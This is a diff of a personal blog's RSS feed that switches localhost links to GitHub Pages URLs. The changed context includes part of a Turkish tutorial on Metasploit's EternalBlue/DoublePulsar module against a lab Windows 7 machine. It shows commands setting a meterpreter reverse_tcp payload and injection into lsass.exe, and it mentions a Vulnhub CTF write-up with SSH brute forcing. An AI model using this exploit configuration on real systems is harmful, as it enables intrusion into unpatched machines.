@@ -3,8 +3,8 @@
 	<channel>
 		<title>Halil ARI</title>
 		<description></description>
-		<link>http://localhost:4000</link>
-		<atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+		<link>https://halilari.github.io</link>
+		<atom:link href="https://halilari.github.io/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
 				<title>Metasploit Framework EternalBlue&Double Pulsar</title>
@@ -48,7 +48,7 @@ exit&lt;/p&gt;
 &lt;p&gt;İçerisinde bulunan &lt;u&gt;deps&lt;/u&gt; klasörü ile &lt;u&gt;eternalblue_doublepulsar.rb&lt;/u&gt; dosyasını kalide &lt;u&gt;/usr/share/metasploit-framework/modules/exploits/windows/smb/&lt;/u&gt; klasörü içersine kopyalıyoruz.&lt;/p&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;service postgresql start - - - &amp;gt; Metasploit veritabanını güncelliyoruz. Artık msfconsole’a geçebiliriz.&lt;/p&gt;
+  &lt;p&gt;service postgresql start - - - &amp;gt; Metasploit’i baştan başlatıyoruz.&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;p&gt;Ben Windows 7 Service Pack1 makinesine sızmayı deneyeceğim.&lt;/p&gt;
@@ -76,7 +76,7 @@ set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/smb/deps
 set rhost 172.16.72.129
 set targetarchıtecture x64
 set payload windows/meterpreter/reverse_tcp
-set processşnject lsass.exe
+set processinject lsass.exe
 set lhost 172.16.72.128
 set target 9
 &lt;/code&gt;&lt;/pre&gt;
@@ -94,8 +94,8 @@ set target 9
 
 </description>
 				<pubDate>Tue, 02 May 2017 00:00:00 +0300</pubDate>
-				<link>http://localhost:4000/2017/05/MetasploitEternalBlueDoublePulsar</link>
-				<guid isPermaLink="true">http://localhost:4000/2017/05/MetasploitEternalBlueDoublePulsar</guid>
+				<link>https://halilari.github.io/2017/05/MetasploitEternalBlueDoublePulsar</link>
+				<guid isPermaLink="true">https://halilari.github.io/2017/05/MetasploitEternalBlueDoublePulsar</guid>
 			</item>
 		
 			<item>
@@ -259,8 +259,8 @@ ssh - - - &amp;gt; ssh servisine brute force yapacağımız belirttik.&lt;/p&gt;
 
 </description>
 				<pubDate>Tue, 11 Apr 2017 00:00:00 +0300</pubDate>
-				<link>http://localhost:4000/2017/04/Tr0llVulnhubWriteup</link>
-				<guid isPermaLink="true">http://localhost:4000/2017/04/Tr0llVulnhubWriteup</guid>
+				<link>https://halilari.github.io/2017/04/Tr0llVulnhubWriteup</link>
+				<guid isPermaLink="true">https://halilari.github.io/2017/04/Tr0llVulnhubWriteup</guid>
 			</item>
 		
 	</channel>
